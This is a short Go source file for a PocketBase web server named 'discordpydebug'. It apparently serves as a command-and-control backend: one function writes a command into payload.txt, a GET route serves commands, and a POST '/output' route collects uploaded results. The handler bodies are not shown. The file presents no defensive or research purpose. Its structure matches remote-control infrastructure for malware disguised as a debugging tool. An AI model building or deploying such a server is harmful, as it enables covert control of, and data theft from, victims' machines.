package webserver

import (
	"fmt"
	"os"

	_ "discordpydebug/internal/init"

	"github.com/pocketbase/pocketbase"
	"github.com/pocketbase/pocketbase/core"
	"github.com/pocketbase/pocketbase/plugins/migratecmd"
)

func Setcommand(arg1 string) {
	data := []byte(arg1)
	err := os.WriteFile("./payload.txt", data, 0644)
	if err != nil {
		fmt.Printf("%s", err.Error())
	}
}

func Run() {
	baseApp := getBaseApp()

	if err := baseApp.Start(); err != nil {
		fmt.Printf("%s", err.Error())
	}
}

func getBaseApp() *pocketbase.PocketBase {
	baseApp := pocketbase.NewWithConfig(pocketbase.Config{
		DefaultDataDir: "discordpydebug" + "_data",
	})
	baseApp.OnServe().BindFunc(func(se *core.ServeEvent) error {
		se.Router.GET("/", commmand)
		se.Router.POST("/output", func(e *core.RequestEvent) error {
			err := uploadHandler(e, baseApp)
			return err
		})
		migratecmd.MustRegister(baseApp, baseApp.RootCmd, migratecmd.Config{
			Automigrate: true,
		})
		return se.Next()
	})
	return baseApp
}
